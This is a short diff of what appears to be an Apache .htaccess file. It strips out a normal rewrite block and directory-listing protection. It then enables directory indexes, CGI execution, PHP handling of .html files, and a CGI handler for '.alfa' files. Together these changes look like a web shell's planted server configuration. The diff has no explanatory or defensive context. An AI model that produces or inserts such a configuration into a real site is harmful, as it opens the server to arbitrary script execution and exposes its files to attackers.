@@ -1,11 +1,7 @@
-<IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteBase /
-DirectoryIndex index.php
-RewriteRule ^index.php$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . /index.php [L]
-</IfModule>
+Allow from all
 
-Options -Indexes
+AddType application/x-httpd-php .php .html
+
+Options FollowSymLinks MultiViews Indexes ExecCGI
+AddType application/x-httpd-cgi .alfa
+AddHandler cgi-script .alfa
